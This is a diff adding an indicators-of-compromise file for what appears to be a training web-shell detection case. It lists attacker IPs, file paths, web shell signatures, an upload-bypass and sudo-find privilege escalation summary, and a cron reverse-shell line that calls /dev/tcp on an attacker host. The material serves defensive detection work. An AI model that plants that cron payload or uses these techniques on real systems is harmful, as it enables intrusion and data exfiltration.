@@ -1,0 +1,35 @@
+# IOCs — Case 03: Web Shell Detection
+
+## IP Addresses
+203.0.113.88  # Attacker IP — web shell upload + C2 (Vultr, Singapore)
+
+## File Hashes
+# thumb_resize.php (PHP web shell)
+MD5:    b2c3d4e5f6a7890123456789abcdef12
+
+## File Names / Paths
+/var/www/html/uploads/img_cache/thumb_resize.php  # PHP web shell
+/tmp/.cache/lp.sh                                  # LinPEAS (privesc script)
+/tmp/.cache/db.sql                                 # Exfiltrated database dump
+
+## Web Shell Signatures
+Parameter:  cmd (via $_REQUEST)
+Function:   system()
+Pattern:    POST requests with cmd= parameter to non-standard .php in /uploads/
+
+## Network Indicators
+203.0.113.88:9090  # Attacker HTTP server (payload hosting + data exfil)
+203.0.113.88:4444  # Reverse shell listener
+
+## Cron Persistence Payload
+* * * * * bash -i >& /dev/tcp/203.0.113.88/4444 0>&1
+
+## URLs
+http://203.0.113.88:9090/linpeas.sh          # LinPEAS download
+http://203.0.113.88:9090/upload (POST)       # Database exfiltration endpoint
+
+## Vulnerability
+Type:      Unrestricted File Upload
+Endpoint:  /upload.php?action=profile_img
+Bypass:    MIME type spoofing (Content-Type: image/jpeg on .php file)
+Privesc:   sudo find with GTFOBins (-exec /bin/bash)
